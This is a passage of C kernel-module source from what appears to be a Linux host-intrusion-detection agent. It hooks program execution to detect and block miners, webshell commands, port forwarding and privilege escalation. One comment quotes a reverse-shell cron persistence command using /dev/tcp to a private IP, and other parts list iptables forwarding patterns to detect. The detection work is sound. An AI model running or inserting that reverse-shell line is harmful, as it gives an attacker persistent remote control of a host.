			req->flags |= PSR_STOPED;
			req->pflags.terminate = 1;
		}
	}
}

static void check_abnormal(taskreq_t *req, struct linux_binprm *bprm)
{
	char *cmd = NULL, *args = NULL, *cwd = NULL, *cmdname = NULL;

	if (!req || !sniper_prule.abnormal_on) {
		return;
	}

	cmd = &(req->args);
	args = cmd + req->cmdlen + 1;
	cwd = args + req->argslen + 1;
	cmdname = safebasename(cmd);

	if (in_unexec_dirs(cmd, cwd)) {
		req->flags |= PSR_ABNORMAL;
		req->pflags.abnormal = 1;
		myprintk("%s(%d) run %s in directory %s\n",
			current->comm, current->pid, args, cwd);

		if (is_trust_cmd(req, EVENT_AbnormalProcess, bprm, NULL)) {
			return;
		}

		if (sniper_prule.abnormal_kill && client_mode == NORMAL_MODE) {
			myprintk("prevent %s(%d) do %s\n",
				current->comm, current->pid, args);
			req->flags |= PSR_STOPED;
			req->pflags.terminate = 1;
		}
	}
}

static int match_iptables_chain(char *cmdline)
{
	char command[6][16] = { "-A", "-I", "-R", "--append", "--insert", "--replace" };
	char chain[4][16] = { "PREROUTING", "POSTROUTING", "OUTPUT", "INPUT" };
	char arg[32] = {0};
	int i = 0, j = 0;

	for (i = 0; i < 6; i++ ) {
		for (j = 0; j < 4; j++) {
			snprintf(arg, 32, " %s %s", command[i], chain[j]);
			if (strstr(cmdline, arg)) {
				return 1;
			}
		}
	}
	return 0;
}
static int match_iptables_action(char *cmdline)
{
	char option[2][16] = { "-j", "--jump" };
	char action[4][16] = { "SNAT", "DNAT", "REDIRECT", "MASQUERADE" };
	char arg[32] = {0};
	int i = 0, j = 0;

	for (i = 0; i < 2; i++ ) {
		for (j = 0; j < 4; j++) {
			snprintf(arg, 32, " %s %s", option[i], action[j]);
			if (strstr(cmdline, arg)) {
				return 1;
			}
		}
	}
	return 0;
}
static int match_iptables_nat(char *args)
{
	/* 下面这些参数是必须的，其他参数未必 */
	if (strstr(args, " -t nat ")     &&
	    match_iptables_chain(args)   &&
	    match_iptables_action(args)) {
		return 1;
	}
	return 0;
}

static int match_iptables_forward(char *cmdline)
{
	char command[6][16] = { "-A", "-I", "-R", "--append", "--insert", "--replace" };
	char arg[32] = {0};
	int i = 0;

	if (strstr(cmdline, " -j ACCEPT") || strstr(cmdline, " --jump ACCEPT")) {
		for (i = 0; i < 6; i++ ) {
			snprintf(arg, 32, " %s FORWARD", command[i]);
			if (strstr(cmdline, arg)) {
				return 1;
			}
		}
	}
	return 0;
}

static int match_firewalld_forward(char *cmdname, char *args)
{
        //if (strcmp(cmdname, "firewall-cmd") == 0 && strstr(args, "--add-forward-port"))
        if (strstr(args, "--add-forward-port")) {
		return 1;
	}
	return 0;
}

/* 仅针对iptables用法，其他端口转发方法，应用层判断 */
static void check_port_forward(taskreq_t *req, struct linux_binprm *bprm)
{
	char *cmd = NULL, *args = NULL, *cmdname = NULL;
	int match = 0;

	if (!sniper_prule.port_forward_on || !req) {
		return;
	}

	cmd = &(req->args);
	cmdname = safebasename(cmd);
	args = cmd + req->cmdlen + 1;

	if (match_iptables_nat(args) ||
	    match_iptables_forward(args) ||
	    match_firewalld_forward(cmdname, args)) {
		match = 1;
        }

	if (!match) {
		return;
	}

	req->flags |= PSR_PORT_FORWARD;
	req->pflags.port_forward = 1;

	if (is_trust_cmd(req, EVENT_Tunnel, bprm, NULL)) {
		return;
	}

	if (strncmp(current->parent->comm, "docker", 6) == 0) {
		req->trust_events |= EVENT_Tunnel;
		myprintk("%s(%d) run port forward %s as trust\n", current->comm, current->pid, args);
		return;
	}

	if (sniper_prule.port_forward_kill && client_mode == NORMAL_MODE) {
		myprintk("prevent %s(%d) run port forward %s\n",
			current->comm, current->pid, args);
		req->flags |= PSR_STOPED;
		req->pflags.terminate = 1;
	}
}

static int cached_cmd_count = 0;
/* 取缓存的命令信息。如果不存在，则新建；如果命令属性有变化，则重建 */
void get_cmd_md5(struct linux_binprm *bprm, char *md5, char *md5_2, struct file *exe_file)
{
	int idx = 0;
	struct file *file = NULL;
	exeinfo_t *exeinfo = NULL, *tmp = NULL;
	struct inode *inode = NULL;
	size_t size = 0, elf_fsize = 0;
	const char *filename = NULL;

	if (bprm) {
		file = bprm->file;
	} else {
		file = exe_file;
	}

	if (sniper_badptr(file) || sniper_badptr(file->f_dentry)) {
		return;
	}
	inode = file->f_dentry->d_inode;
	if (sniper_badptr(inode)) {
		return;
	}
	size = i_size_read(inode);

	if (bprm) {
		filename = bprm->filename;
	} else {
		filename = file->f_dentry->d_name.name;
	}

	idx = inode->i_ino % EXELISTNUM;

	/* 查找缓冲的md5 */
	read_lock(&exelist[idx].lock);
	list_for_each_entry_safe(exeinfo, tmp, &exelist[idx].queue, list) {
		if (exeinfo->ino != inode->i_ino ||
		    exeinfo->dev != inode->i_rdev) {
			continue;
		}

		/* 取到缓冲的md5 */
		if (exeinfo->ctime == inode->i_ctime.tv_sec) {
			memcpy(md5, exeinfo->md5, S_MD5LEN);
			memcpy(md5_2, exeinfo->md5_2, S_MD5LEN);
			read_unlock(&exelist[idx].lock);
			return;
		}

		read_unlock(&exelist[idx].lock);

		mypdebug("recalculate %s md5\n", filename);
		/* 程序属性有变化，更新其md5 */
		if (md5_file(file, md5, size) < 0) {
			return;
		}

		/* 文件大小和elf头里的不同，用后者再算一个md5，
		   防止简单地在程序尾部追加任意字符，就骗过检查 */
		if (bprm) {
			elf_fsize = elfhdr_filesize(bprm);
			if (elf_fsize && elf_fsize != size) {
				md5_file(file, md5_2, elf_fsize);
			}
		}

		write_lock(&exelist[idx].lock);
		memcpy(exeinfo->md5, md5, S_MD5LEN);
		memcpy(exeinfo->md5_2, md5_2, S_MD5LEN);
		exeinfo->ctime = inode->i_ctime.tv_sec;
		write_unlock(&exelist[idx].lock);
		return;
	}
	read_unlock(&exelist[idx].lock);

	if (md5_file(file, md5, size) < 0) {
		return;
	}
	if (bprm) {
		elf_fsize = elfhdr_filesize(bprm);
		if (elf_fsize && elf_fsize != size) {
			md5_file(file, md5_2, elf_fsize);
		}
	}

	/* 新的程序，插入exelist */
	exeinfo = sniper_kmalloc(sizeof(exeinfo_t), GFP_ATOMIC, KMALLOC_EXELIST);
	if (!exeinfo) {
		myprintk("%s(%d) get %s md5 fail: no memory!\n",
			current->comm, current->pid, filename);
		return;
	}

	memcpy(exeinfo->md5, md5, S_MD5LEN);
	memcpy(exeinfo->md5_2, md5_2, S_MD5LEN);
	exeinfo->ctime = inode->i_ctime.tv_sec;
	exeinfo->ino = inode->i_ino;
	exeinfo->dev = inode->i_rdev;

	write_lock(&exelist[idx].lock);
	list_add_tail(&exeinfo->list, &exelist[idx].queue);
	cached_cmd_count++;
	mypdebug("cached command count: %d\n", cached_cmd_count);
	write_unlock(&exelist[idx].lock);
}

/*
 * 检测是否为内核线程执行的高频命令，用于过滤。如
 * /sbin/modprobe -q -- net-pf-10
 *     见过 centos5.6的khelper 和 ubuntu 1604的kworker 做这个
 *     这条命令的意思是加载ipv6模块，10代表AF_INET6
 * /sbin/modprobe -q -- char-major-195
 *     char-major-195是NVIDIA显卡
 * /usr/lib/systemd/systemd-cgroups-agent /user.slice/user-0.slice/session-10133.scope
 *     见过 centos7.8的kworker 做这个
 */
//TODO
//1、被加载的驱动是否有异常，或许可以钩模块加载处检查
//2、高频命令首次做报告，难点在命令参数会变的，如session-nnnnn，
//   如modporbe加载fs-binfmt_misc/binfmt-e380/netdev-eth0/eth0/tcp_lp/iptable_filter/ipt_DNAT/
//   char-major-10-229/ipt_addrtype/iptable_nat/nf_conntrack-2/ipt_MASQUERADE/rtnl-link-veth等
static int is_kthread_high_frequency_cmd(char *args)
{
	int i = 0, len = 0;
	char *kworker_cmd[] = {
		"/sbin/modprobe -q -- ",
		"/usr/sbin/modprobe -q -- ",
		"/lib/systemd/systemd-cgroups-agent ",
		"/usr/lib/systemd/systemd-cgroups-agent ",
		NULL
	};

	if (sniper_badptr(args)) {
		return 0;
	}
	if (strncmp(current->comm, "kworker/", 8) != 0 &&
	    strcmp(current->comm, "khelper") != 0) {
		return 0;
	}

	i = 0;
	while (kworker_cmd[i]) {
		len = strlen(kworker_cmd[i]);
		if (strncmp(args, kworker_cmd[i], len) == 0) {
			return 1;
		}
		i++;
	}
	return 0;
}

//TODO 1、能禁./my.sh，但禁不了sh my.sh  2、考察wine执行windows程序的情况
static void check_event(taskreq_t *req, struct linux_binprm *bprm)
{
	char *cmd = NULL, *args = NULL, *cwd = NULL;
	struct kern_process_rules prule = {0};
#if LINUX_VERSION_CODE > KERNEL_VERSION(2,6,18)
	char *hostname = NULL, *nodename = NULL;
#endif

	if (!req) {
		myprintk("%s(%d) check_event fail, NULL req\n",
			current->comm, current->pid);
		return;
	}

	cmd = &(req->args);
	args = cmd + req->cmdlen + 1;
	cwd = args + req->argslen + 1;

	//TODO 对阻断的命令，总是取ip?

	read_lock(&sniper_prule_lock);
	prule = sniper_prule;
	read_unlock(&sniper_prule_lock);

#if LINUX_VERSION_CODE > KERNEL_VERSION(2,6,18)
	/* 对docker里的命令暂不检查事件 */
	hostname = init_utsname()->nodename;
	nodename = utsname()->nodename;
	if (strcmp(nodename, hostname) != 0) {
		req->pflags.docker = 1;
		strncpy(req->nodename, nodename, S_NAMELEN);
		return;
	}
#endif

	/* 阻断黑名单命令 */
	if (is_black_cmd(req, bprm)) {
		req->flags |= PSR_BLACK | PSR_STOPED;
		req->pflags.black = 1;
		req->pflags.terminate = 1;
		myprintk("prevent %s(%d) run black command %s\n", current->comm, current->pid, args);
		return;
	}

	/* 丢弃过滤的命令 */
	if (is_filter_cmd(req, bprm)) {
		req->flags |= PSR_FILTER;
		return;
	}

	/* 被提权执行 */
	/* 如果当前进程是非法提权程序，且要阻断，则不执行新的程序，新程序按一般进程报告。
	   不阻断则检查新的程序是否命中事件 */
	if (check_privup(&req->pinfo, PRIVUP_EXEC, args) == PRIVUP_STOP) {
		myprintk("forbid privup-process %s(%d) to exec %s\n", current->comm, current->pid, args);
		req->flags |= PSR_STOPED;
		req->pflags.terminate = 1;
		req->pflags.privup_parent = 1;
		return;
	}

	/* 高危事件 */

	/* 挖矿 */
	check_miner(req, bprm);
	if (req->flags & PSR_STOPED) {
		return;
	}

	/* 检查中国菜刀命令 */
	check_webshell(req, bprm);
	if (req->flags & PSR_STOPED) {
		return;
	}

	/* 中危 */
	/* 检查端口转发命令 */
	check_port_forward(req, bprm);
	if (req->flags & PSR_STOPED) {
		return;
	}

	/* 检查危险命令 */
	check_danger(req, bprm);
	if (req->flags & PSR_STOPED) {
		return;
	}

	/* 检查异常进程 */
	check_abnormal(req, bprm);
	if (req->flags & PSR_STOPED) {
		return;
	}

	/* 低危 */
	/* 检查中间件执行命令 */
	check_webexecute(req, bprm);
	if (req->flags & PSR_STOPED) {
		return;
	}
}

static void my_put_arg_page(struct page *page, int getpage)
{
	if (getpage) {
		put_page(page);
	}
}

static struct page *my_get_arg_page(struct linux_binprm *bprm, unsigned long pos, int getpage)
{
	struct page *page;
	int ret;

#if !defined(CONFIG_MMU) || LINUX_VERSION_CODE < KERNEL_VERSION(2,6,23)
	/* 高版本内核，CONFIG_MMU(默认)时bprm无page[] */
	if (!getpage) {
		page = bprm->page[pos / PAGE_SIZE];
		return page;
	}
#endif

#if LINUX_VERSION_CODE < KERNEL_VERSION(5,8,0)
	down_write(&bprm->mm->mmap_sem);
#else
	down_write(&bprm->mm->mmap_lock);
#endif

#if LINUX_VERSION_CODE >= KERNEL_VERSION(4,4,0) && LINUX_VERSION_CODE < KERNEL_VERSION(4,5,0)
	ret = get_user_pages(current, bprm->mm, pos, 1, 1, &page, NULL);
#elif LINUX_VERSION_CODE < KERNEL_VERSION(4,6,0)
        ret = get_user_pages(current, bprm->mm, pos, 1, 0, 1, &page, NULL);
#elif LINUX_VERSION_CODE < KERNEL_VERSION(4,9,0)
        ret = get_user_pages_remote(current, bprm->mm, pos, 1, 0, 1, &page, NULL);
#elif LINUX_VERSION_CODE < KERNEL_VERSION(4,10,0)
        ret = get_user_pages_remote(current, bprm->mm, pos, 1, FOLL_FORCE, &page, NULL);
#elif LINUX_VERSION_CODE < KERNEL_VERSION(5,9,0)
        ret = get_user_pages_remote(current, bprm->mm, pos, 1, FOLL_FORCE, &page, NULL, NULL);
#else
        ret = get_user_pages_remote(bprm->mm, pos, 1, FOLL_FORCE, &page, NULL, NULL);
#endif

#if LINUX_VERSION_CODE < KERNEL_VERSION(5,8,0)
	up_write(&bprm->mm->mmap_sem);
#else
	up_write(&bprm->mm->mmap_lock);
#endif

        if (ret <= 0) {
                return NULL;
	}
        return page;
}

//从bprm结构获得程序的参数
static int get_args_from_bprm(struct linux_binprm *bprm, taskreq_t *req)
{
	unsigned long offset = 0, pos = 0;
	char *kaddr = NULL, *args = NULL;
	struct page *page = NULL;
	int argc = 0, count = 0, argslen = 0, i = 0, argoff = 0;
	int argstoolong = 0, getpage = 1;

	if (!bprm || !req) {
		return -1;
	}

	args = &(req->args) + req->cmdlen + 1;

	argc = bprm->argc;
	pos = bprm->p;
#if !defined(CONFIG_MMU) || LINUX_VERSION_CODE < KERNEL_VERSION(2,6,23)
	if (pos <= old_p_max) {
		getpage = 0;
	}
#endif

	argoff = 0; //第一个参数的起始位置
	do {
		offset = pos & ~PAGE_MASK;
		page = my_get_arg_page(bprm, pos, getpage);
		if (!page) {
			argslen += 3;
			if (argslen >= S_ARGSLEN - 1) {
				argslen = S_ARGSLEN - 1;
			}
			args[argslen] = 0;
			args[argslen-1] = '.';
			args[argslen-2] = '.';
			args[argslen-3] = '.';

			myprintk("my_get_arg_page from %#lx fail\n", pos);
			return argslen;
		}

		kaddr = kmap(page);
		for (; offset < PAGE_SIZE && count < argc; offset++, pos++) {
			if (argslen >= S_ARGSLEN - 3) { //预留1个结束符+2个双引号
				argstoolong = 1;
				break;
			}

			if (kaddr[offset] == '\0') { //一个参数结束
				count++;

				/* 如果参数带空格，用双引号把参数括起来 */
				if (strchr(args+argoff, ' ')) {
					/* 把参数整体后移一位 */
					for (i = argslen; i > argoff; i--) {
						args[i] = args[i-1];
					}
					args[argoff] = '"';    //参数头部加双引号
					args[argslen+1] = '"'; //参数尾部加双引号
					argslen += 2;          //参数长度多了2个双引号
				}

				args[argslen] = ' ';  //用空格作为与下一个参数的分隔符
				argoff = argslen + 1; //下一个参数的起始位置

				if (!req->argv0len) {
					req->argv0len = argslen;
				}

// 考虑到下面这样的命令，不丢弃换行符之后的参数
// echo -e "\n\n*/10 * * * * /bin/bash -i >& /dev/tcp/192.168.1.119/1234 0>&1\n\n" >/var/spool/cron/root
#if 0
			} else if (kaddr[offset] == '\n') { //丢弃换行符之后的参数
				argslen += 3;
				if (argslen >= S_ARGSLEN - 1) {
					argslen = S_ARGSLEN - 1;
					argstoolong = 1;
				} else {
					args[argslen] = 0;
					args[argslen - 1] = '.';
					args[argslen - 2] = '.';
					args[argslen - 3] = '.';
				}
				break;
#endif

			} else { //一个字节一个字节拷贝参数
				args[argslen] = kaddr[offset];
				if (args[argslen] == '-' && argslen && args[argslen-1] == ' ') {
					req->options++;
				}
			}
			argslen++;
		}

		kunmap(page);
		my_put_arg_page(page, getpage);

		/* 如果参数截短了，命令行尾部改成...，表示截短了 */
		if (argstoolong) {
			/* 如果参数带空格，用双引号把参数括起来 */
			if (strchr(args+argoff, ' ')) {
				/* 把参数整体后移一位 */
				for (i = S_ARGSLEN - 6; i > argoff; i--) {
					args[i] = args[i-1];
				}
				args[argoff] = '"';        //参数头部加双引号
				args[S_ARGSLEN - 5] = '.';
				args[S_ARGSLEN - 4] = '.';
				args[S_ARGSLEN - 3] = '.';
				args[S_ARGSLEN - 2] = '"'; //参数尾部加双引号
				args[S_ARGSLEN - 1] = 0;
			} else {
				args[S_ARGSLEN - 4] = '.';
				args[S_ARGSLEN - 3] = '.';
				args[S_ARGSLEN - 2] = '.';
				args[S_ARGSLEN - 1] = 0;
			}
			argslen = S_ARGSLEN - 1;
			break;
		}
	} while (offset == PAGE_SIZE); //继续解析下一个参数页

	args[argslen] = 0;
	if (argslen && args[argslen-1] == ' ') {
		args[argslen-1] = 0;
		argslen--;
	}

	return argslen;
}

/* get realpath of bprm->filename. return realpath len */
static int parse_cmd(char *cmd, struct linux_binprm *bprm)
{
	char *path = (char *)bprm->filename;
	char *tmp = NULL;
	char *pathname = NULL;
	int len = 0, headlen = 0, taillen = 0, tailoff = 0;

	if (path[0] != '/' || strstr(path, "//") ||
	    strstr(path, "/./") || strstr(path, "/../")) {
		tmp = sniper_kmalloc(PATH_MAX, GFP_ATOMIC, KMALLOC_REALCMD);
		if (!tmp) {
			myprintk("parse_cmd fail: no memory! use %s\n", path);
		} else {
#if LINUX_VERSION_CODE < KERNEL_VERSION(2,6,25)
			pathname = d_path(bprm->file->f_dentry, bprm->file->f_vfsmnt, tmp, PATH_MAX);
#else
			pathname = d_path(&bprm->file->f_path, tmp, PATH_MAX);
#endif
			if (IS_ERR(pathname)) {
				myprintk("parse_cmd fail: d_path error %ld. use %s\n",
					PTR_ERR(pathname), path);
				sniper_kfree(tmp, PATH_MAX, KMALLOC_REALCMD);
				tmp = NULL;
			} else {
				path = pathname;
			}
		}
	}

	len = strlen(path);
	if (len < S_CMDLEN - 1) {
		memcpy(cmd, path, len);
	} else { // 命令长度超长，保留头尾，中间用...代替，即xxxx...yyyy
		/* 头部长度 = (最大命令长度 - 3个.)/2 = (S_CMDLEN - 1 - 3)/2 */
		headlen = S_CMDLEN / 2 - 2;
		/* 尾部长度 = 最大命令长度 - 3个. - 头部长度 = S_CMDLEN - 1 - headlen - 3 */
		taillen = S_CMDLEN - headlen - 4;
		/* 从哪里开始拷超长命令的尾部：命令长度 - 尾部长度 */
		tailoff = len - taillen;

		memcpy(cmd, path, headlen);
		cmd[headlen] = '.';
		cmd[headlen+1] = '.';
		cmd[headlen+2] = '.';
		memcpy(cmd+headlen+3, path+tailoff, taillen);

		len = S_CMDLEN - 1;
	}
	cmd[len] = 0;

	if (tmp) {
		sniper_kfree(tmp, PATH_MAX, KMALLOC_REALCMD);
	}

	return len;
}

/* always not in interrupt */
int my_bprm_check_security(struct linux_binprm *bprm)
{
	int flags = PSR_EXEC, ret = 0;
	char *cmd = NULL, *args = NULL, *cwd = NULL;
	taskreq_t *req = NULL;
	struct parent_info pinfo = {{{0}}};

	if (sniper_fpolicy.printer_on && sniper_fpolicy.printer_terminate &&
	    strcmp(safebasename((char *)bprm->filename), "cupsd") == 0) {
		mypdebug("forbid cupsd, disable printer\n");
		return -1;
	}

	if (!process_engine_status()) { //不监控进程
		return 0;
	}

	/* prelink会做很多ld-linux-x86-64.so.2 */
	if (strcmp(bprm->filename, "/lib64/ld-linux-x86-64.so.2") == 0) {
		return 0;
	}
        /* Skip sniper self exec */
	if (skip_current(&flags, &pinfo)) {
		return 0;
	}

	if (flags & PSR_CRON) {
		if (strcmp(bprm->filename, "/opt/snipercli/sniper_chk") == 0 ||
		    strcmp(bprm->filename, "/opt/snipercli/assist_sniper_chk") == 0) {
			return 0;
		}
	}

	req = init_taskreq(0);
	if (!req) {
		return 0;
	}

	if (flags & PSR_CRON) {
		req->flags |= PSR_CRON;
		req->pflags.cron = 1;
	}
	memcpy(&req->pinfo, &pinfo, sizeof(struct parent_info));

	/* 取命令 */
	cmd = &(req->args);
	req->cmdlen = parse_cmd(cmd, bprm);

	/* 取命令行参数 */
	req->argc = bprm->argc;
	ret = get_args_from_bprm(bprm, req);

	if (ret < 0) {
		sniper_kfree(req, ARGS_LEN, KMALLOC_TASKREQ);
		return 0;
	}
	req->argslen = ret;

	args = cmd + req->cmdlen + 1;
	if (is_kthread_high_frequency_cmd(args)) {
		sniper_kfree(req, ARGS_LEN, KMALLOC_TASKREQ);
		return 0;   //忽略内核线程执行的高频命令
	}

	if (flags & PSR_CRON) {
		if (strstr(args, "/opt/snipercli/sniper_chk") ||
		    strstr(args, "/opt/snipercli/assist_sniper_chk")) {
			sniper_kfree(req, ARGS_LEN, KMALLOC_TASKREQ);
			return 0;
		}
	}

	/* 取当前目录 */
	cwd = args + req->argslen + 1;
	req->cwdlen = getcwdpath(cwd, S_CWDLEN); //结果已经0结尾
	if (req->cwdlen <= 0) {
		myprintk("%s(%d) exec %s, get cwd fail. set to /\n",
			current->comm, current->pid, args);
		cwd[0] = '/';
		cwd[1] = 0;
		req->cwdlen = 1;
	}

	check_event(req, bprm);
	if (req->flags & PSR_FILTER) {
		sniper_kfree(req, ARGS_LEN, KMALLOC_TASKREQ);
		return 0;
	}

#define FIX_COMMANDLINE_AUDIT_BUG3939 1
#ifdef FIX_COMMANDLINE_AUDIT_BUG3939
	req->pflags.commandline = is_commandline();
#endif
	get_pipeino(req);

#if 1 // test get_current_peer
	if (!(req->flags & PSR_NETWORK)) {
		conninfo_t info = {0};

		if (get_current_peer(&info)) {
			req->flags |= PSR_NETWORK;
			my_addr2ip(&info.daddr, req->ip, info.family);
		}
	}
#endif

	if (exec_debug) {
		char dockername[128] = {0};
#if LINUX_VERSION_CODE > KERNEL_VERSION(2,6,18)
		if (current->nsproxy && current->nsproxy->uts_ns && req->pflags.docker) {
			snprintf(dockername, 128, "docker-%s: ",
				current->nsproxy->uts_ns->name.nodename);
		}
#endif
		myprintk("%s%s(%d) exec %s(%s) in %s. argc %d. "
			 "uid %d/%d. loginuid %d. flags %#x. "
			 "tty %s, cron %#x, ip %s. commandline %d. "
			 "proctime %lu. %s(%d %lu) %s(%d %lu) %s(%d %lu)\n",
			 dockername,
			 current->comm, current->pid,
			 cmd, args, cwd, req->argc,
			 req->uid, req->euid, loginuid(current),
			 req->flags, req->tty, req->flags&PSR_CRON, req->ip,
			 req->pflags.commandline, req->proctime,
			 req->pinfo.task[0].comm, req->pinfo.task[0].pid, req->pinfo.task[0].proctime,
			 req->pinfo.task[1].comm, req->pinfo.task[1].pid, req->pinfo.task[1].proctime,
			 req->pinfo.task[2].comm, req->pinfo.task[2].pid, req->pinfo.task[2].proctime);
	}
	if (exec_debug == PDEBUG_FDS) {
		myprintk("current fds:\n");
		print_task_fds(current->files);
		myprintk("parent fds:\n");
		print_task_fds(current->parent->files);
	}

	if (process_engine_status() == PDEBUG_DEVELOP) { //开发调试，只监控不上报
		sniper_kfree(req, ARGS_LEN, KMALLOC_TASKREQ);
		return 0;
	}

	req->size = sizeof(taskreq_t) + req->cmdlen + req->argslen + req->cwdlen + 2;
	send_data_to_user((char *)req, req->size, nl_exec_pid, Probe_proc);

	if (req->flags & PSR_STOPED) {
		sniper_kfree(req, ARGS_LEN, KMALLOC_TASKREQ);
		return -1;
	}

	sniper_kfree(req, ARGS_LEN, KMALLOC_TASKREQ);
	return 0;
}

#if LINUX_VERSION_CODE < KERNEL_VERSION(4,2,0)
int sniper_bprm_check_security(struct linux_binprm *bprm)
{
	int ret = 0;

	atomic_inc(&sniper_usage[SNIPER_EXECVE]);

	ret = my_bprm_check_security(bprm);
	if (ret < 0) {
		atomic_dec(&sniper_usage[SNIPER_EXECVE]);
		return ret;
	}

	if (original_bprm_check_security) {
		ret = original_bprm_check_security(bprm);
	}

	atomic_dec(&sniper_usage[SNIPER_EXECVE]);

	return ret;
}
#else
int sniper_bprm_check_security(struct linux_binprm *bprm)
{
	int ret = 0;

	atomic_inc(&sniper_usage[SNIPER_EXECVE]);

	ret = my_bprm_check_security(bprm);

	atomic_dec(&sniper_usage[SNIPER_EXECVE]);

	return ret;
}
#endif
